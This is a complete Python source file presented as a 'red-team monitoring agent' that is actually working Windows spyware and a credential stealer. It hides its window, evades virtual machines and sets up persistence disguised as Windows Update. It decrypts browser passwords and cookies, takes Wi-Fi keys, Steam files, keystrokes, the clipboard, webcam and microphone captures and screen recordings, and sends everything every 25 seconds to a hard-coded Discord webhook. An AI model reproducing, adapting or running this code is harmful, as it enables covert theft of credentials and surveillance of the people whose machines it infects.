# =====================================================
# ULTIMATE RED-TEAM MONITORING AGENT v5.2 - ENHANCED FULL EXFIL
# =====================================================
import os
import sys
import time
import socket
import platform
import threading
import subprocess
import getpass
import ctypes
import base64
import json
import random
import shutil
import tempfile
from datetime import datetime
import win32gui
import requests
import psutil
import pyperclip
import cv2
import numpy as np
import sounddevice as sd
import wave
from pynput.keyboard import Listener as KeyboardListener
import pyautogui
import sqlite3
import win32crypt
try:
    from Crypto.Cipher import AES
    CRYPTO_AVAILABLE = True
except:
    CRYPTO_AVAILABLE = False

# ================== CONFIG ==================
DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1504108072963014798/T6FC93tE6R8KYmeckjzuvsoTe_cdD6s8Acpo0IBgb6OqLvH54_1uBW9UKFdBPAZiAFx6"
INTERVAL = 25
SCREENSHOT_INTERVAL = 60
RECORD_DURATION = 15
LOG_FILE = os.path.join(os.getenv('APPDATA'), "WindowsUpdate.log")

def log(msg):
    try:
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        line = f"[{ts}] {msg}"
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(line + "\n")
        print(line)
    except:
        pass

log("=== AGENT v5.2 ENHANCED FULL EXFIL STARTED ===")

# ================== BROWSER PATHS ==================
BROWSER_PATHS = {
    "Chrome": os.path.join(os.getenv('LOCALAPPDATA'), r"Google\Chrome\User Data"),
    "Edge": os.path.join(os.getenv('LOCALAPPDATA'), r"Microsoft\Edge\User Data"),
    "Brave": os.path.join(os.getenv('LOCALAPPDATA'), r"BraveSoftware\Brave-Browser\User Data"),
    "Opera": os.path.join(os.getenv('APPDATA'), r"Opera Software\Opera Stable"),
    "OperaGX": os.path.join(os.getenv('APPDATA'), r"Opera Software\Opera GX Stable"),
    "Firefox": os.path.join(os.getenv('APPDATA'), r"Mozilla\Firefox\Profiles"),
    "Vivaldi": os.path.join(os.getenv('LOCALAPPDATA'), r"Vivaldi\User Data"),
}

def stealth_mode():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        ctypes.windll.kernel32.SetConsoleTitleW("".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=15)))
    except:
        pass

def detect_vm():
    suspicious = ["vbox", "vmware", "sandbox", "debugger", "qemu", "virtual", "test"]
    hostname = socket.gethostname().lower()
    vm_score = sum(1 for x in suspicious if x in hostname)
    if psutil.cpu_percent(interval=1) < 15:
        vm_score += 2
    return vm_score >= 2, hostname

def add_persistence(script_path):
    try:
        import winreg as reg
        key = reg.HKEY_CURRENT_USER
        reg_key = reg.OpenKey(key, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(reg_key, "WindowsUpdateSvc", 0, reg.REG_SZ, f'pythonw "{script_path}"')
        reg.CloseKey(reg_key)
        startup = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup")
        shutil.copy(script_path, os.path.join(startup, "svchost.pyw"))
        subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "pythonw {script_path}" /sc onlogon /ru SYSTEM /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log("Persistence added")
    except Exception as e:
        log(f"Persistence error: {e}")

def get_master_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except:
        return None

def decrypt_password(encrypted, master_key):
    if not encrypted:
        return "N/A"
    try:
        if encrypted.startswith(b'v1') and CRYPTO_AVAILABLE and master_key:
            iv = encrypted[3:15]
            ciphertext = encrypted[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(ciphertext)[:-16].decode('utf-8', errors='ignore')
        else:
            return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except:
        return "DECRYPT_FAILED"

def extract_all_browser_data():
    txt_files = {}
    for browser, base_path in BROWSER_PATHS.items():
        if not os.path.exists(base_path):
            continue
        profiles = ["Default"] + [d for d in os.listdir(base_path) if d.startswith("Profile") or "default" in d.lower()][:5]
        for profile in profiles:
            profile_path = os.path.join(base_path, profile)
            if not os.path.exists(profile_path):
                continue
            local_state = os.path.join(base_path, "Local State") if browser != "Firefox" else None
            master_key = get_master_key(local_state) if local_state and os.path.exists(local_state) else None
            content = f"=== {browser} - {profile} FULL DUMP ===\n\n"
            # PASSWORDS
            login_db = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_db):
                try:
                    shutil.copy2(login_db, "temp_login.db")
                    conn = sqlite3.connect("temp_login.db")
                    cursor = conn.cursor()
                    content += "=== PASSWORDS ===\n"
                    for row in cursor.execute("SELECT origin_url, username_value, password_value FROM logins"):
                        url, user, enc = row
                        plain = decrypt_password(enc, master_key)
                        content += f"URL: {url}\nUSER: {user}\nPASS: {plain}\n{'-'*80}\n"
                    conn.close()
                    os.remove("temp_login.db")
                except:
                    pass
            # HISTORY
            history_db = os.path.join(profile_path, "History")
            if os.path.exists(history_db):
                try:
                    shutil.copy2(history_db, "temp_hist.db")
                    conn = sqlite3.connect("temp_hist.db")
                    cursor = conn.cursor()
                    content += "\n=== HISTORY (last 100) ===\n"
                    for row in cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100"):
                        content += f"{row[0]} | {row[1]}\n"
                    conn.close()
                    os.remove("temp_hist.db")
                except:
                    pass
            # COOKIES
            cookie_db = os.path.join(profile_path, "Cookies")
            if os.path.exists(cookie_db):
                try:
                    shutil.copy2(cookie_db, "temp_cookie.db")
                    conn = sqlite3.connect("temp_cookie.db")
                    cursor = conn.cursor()
                    content += "\n=== COOKIES (sample 150) ===\n"
                    for row in cursor.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 150"):
                        host, name, enc = row
                        val = decrypt_password(enc, master_key)
                        content += f"{host} | {name} = {val[:80]}\n"
                    conn.close()
                    os.remove("temp_cookie.db")
                except:
                    pass
            fname = f"{browser}_{profile}_FULL.txt"
            with open(fname, "w", encoding="utf-8") as f:
                f.write(content)
            with open(fname, "rb") as f:
                txt_files[fname] = (fname, f.read(), "text/plain")
            os.remove(fname)
    return txt_files

def get_big_system_info(vm_detected=False):
    hostname = socket.gethostname()
    try:
        public_ip = requests.get("https://api.ipify.org", timeout=5).text
    except:
        public_ip = "N/A"
    info = {
        "timestamp": datetime.utcnow().isoformat(),
        "hostname": hostname,
        "user": getpass.getuser(),
        "ip_local": socket.gethostbyname(socket.gethostname()),
        "ip_public": public_ip,
        "os": platform.platform(),
        "cpu": f"{psutil.cpu_percent(interval=1)}% | {psutil.cpu_count()} cores",
        "ram": f"{psutil.virtual_memory().percent}% ({psutil.virtual_memory().available // (1024**3)} GB free)",
        "disk": f"{psutil.disk_usage('/').percent}% full",
        "active_window": win32gui.GetWindowText(win32gui.GetForegroundWindow()),
        "processes": len(psutil.pids()),
        "vm_detected": vm_detected,
        "python": sys.version,
        "logged_in_since": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
    }
    return info, hostname

def get_clipboard():
    try:
        return pyperclip.paste()[:2000]
    except:
        return "N/A"

def get_wifi_passwords():
    try:
        result = subprocess.check_output("netsh wlan show profile", shell=True).decode(errors="ignore")
        profiles = [line.split(":")[1].strip() for line in result.splitlines() if "All User Profile" in line]
        passwords = {}
        for profile in profiles:
            try:
                pw = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode(errors="ignore")
                pw = [line.split(":")[1].strip() for line in pw.splitlines() if "Key Content" in line][0]
                passwords[profile] = pw
            except:
                pass
        return passwords
    except:
        return "N/A"

keylog_buffer = []
def on_press(key):
    global keylog_buffer
    try:
        keylog_buffer.append(str(key.char))
    except:
        keylog_buffer.append(f"[{key}]")
    if len(keylog_buffer) > 800:
        keylog_buffer = keylog_buffer[-800:]

def start_keylogger():
    try:
        listener = KeyboardListener(on_press=on_press)
        listener.daemon = True
        listener.start()
        log("Keylogger started")
    except:
        pass

def capture_webcam_and_mic():
    files = {}
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame)
            files["webcam.jpg"] = ("webcam.jpg", buffer.tobytes(), "image/jpeg")
    except:
        pass
    try:
        fs = 44100
        recording = sd.rec(int(8 * fs), samplerate=fs, channels=1, dtype='int16')
        sd.wait()
        with wave.open("mic.wav", "wb") as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(fs)
            wf.writeframes(recording.tobytes())
        with open("mic.wav", "rb") as f:
            files["mic.wav"] = ("mic.wav", f.read(), "audio/wav")
        os.remove("mic.wav")
    except:
        pass
    return files

def capture_screen_record():
    try:
        frames = []
        for _ in range(RECORD_DURATION):
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            frames.append(frame)
            time.sleep(1/12)
        height, width = frames[0].shape[:2]
        out = cv2.VideoWriter("screen.mp4", cv2.VideoWriter_fourcc(*'mp4v'), 12, (width, height))
        for f in frames:
            out.write(f)
        out.release()
        with open("screen.mp4", "rb") as f:
            data = f.read()
        os.remove("screen.mp4")
        return {"screen.mp4": ("screen.mp4", data, "video/mp4")}
    except:
        return {}

def send_chunked_webhook(content, files=None):
    if not files:
        requests.post(DEFAULT_WEBHOOK, json={"content": content}, timeout=30)
        return
    current_files = {}
    total_size = 0
    MAX_SIZE = 7_500_000
    for fname, data in list(files.items()):
        size = len(data[1])
        if total_size + size > MAX_SIZE:
            requests.post(DEFAULT_WEBHOOK, json={"content": content}, files=current_files, timeout=30)
            current_files = {}
            total_size = 0
        current_files[fname] = data
        total_size += size
    if current_files:
        requests.post(DEFAULT_WEBHOOK, json={"content": content}, files=current_files, timeout=30)

def steal_steam_data():
    steam_data = {"accounts": {}, "config": {}, "ssfn": []}
    steam_path = os.path.join(os.getenv('PROGRAMFILES(x86)'), r"Steam") or os.path.join(os.getenv('PROGRAMFILES'), r"Steam")
    if not os.path.exists(steam_path):
        return steam_data
    for f in os.listdir(steam_path):
        if f.startswith("ssfn"):
            try:
                with open(os.path.join(steam_path, f), "rb") as sf:
                    steam_data["ssfn"].append({"name": f, "data": base64.b64encode(sf.read()).decode()})
            except:
                pass
    login_vdf = os.path.join(steam_path, "config", "loginusers.vdf")
    if os.path.exists(login_vdf):
        steam_data["accounts"] = open(login_vdf, "r", encoding="utf-8").read()[:8000]
    return steam_data

# ================== MAIN LOOP ==================
def main_loop(script_path):
    log("Main loop started")
    add_persistence(script_path)
    stealth_mode()
    start_keylogger()
    ss_count = 0
    while True:
        try:
            vm_detected, hostname = detect_vm()
            sys_info, _ = get_big_system_info(vm_detected)

            # BIG PC NAME TITLE + RICH INFO
            title = f"# 🛡️ `{hostname.upper()}` - AGENT v5.2 FULL EXFIL\n**{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}**\n"

            payload_content = title + "```json\n" + json.dumps(sys_info, indent=2) + "\n```"

            # Collect all data
            files = extract_all_browser_data()
            files.update(capture_webcam_and_mic())

            if ss_count % (SCREENSHOT_INTERVAL // INTERVAL) == 0:
                try:
                    shot = pyautogui.screenshot()
                    shot.save("screen.png")
                    with open("screen.png", "rb") as f:
                        files["screen.png"] = ("screen.png", f.read(), "image/png")
                    os.remove("screen.png")
                except:
                    pass

            if ss_count % 6 == 0:
                files.update(capture_screen_record())

            # Extra rich files
            extra = {
                "clipboard.txt": ("clipboard.txt", get_clipboard().encode(), "text/plain"),
                "wifi.txt": ("wifi.txt", json.dumps(get_wifi_passwords(), indent=2).encode(), "text/plain"),
                "keylog.txt": ("keylog.txt", ("".join(keylog_buffer[-800:]) or "N/A").encode(), "text/plain"),
                "steam.txt": ("steam.txt", json.dumps(steal_steam_data(), indent=2).encode(), "text/plain"),
            }
            files.update(extra)

            # Send everything (auto-split if too big)
            send_chunked_webhook(payload_content, files)

            log("Full enhanced exfil successful")
            ss_count += 1
            time.sleep(INTERVAL)
        except Exception as e:
            log(f"Main loop error: {e}")
            time.sleep(10)

# =============== START ===============
if __name__ == "__main__":
    stealth_mode()
    script_path = os.path.abspath(sys.argv[0])
    log("Launching main thread")
    threading.Thread(target=main_loop, args=(script_path,), daemon=False).start()
    log("Agent v5.2 fully started")
    while True:
        time.sleep(3600)
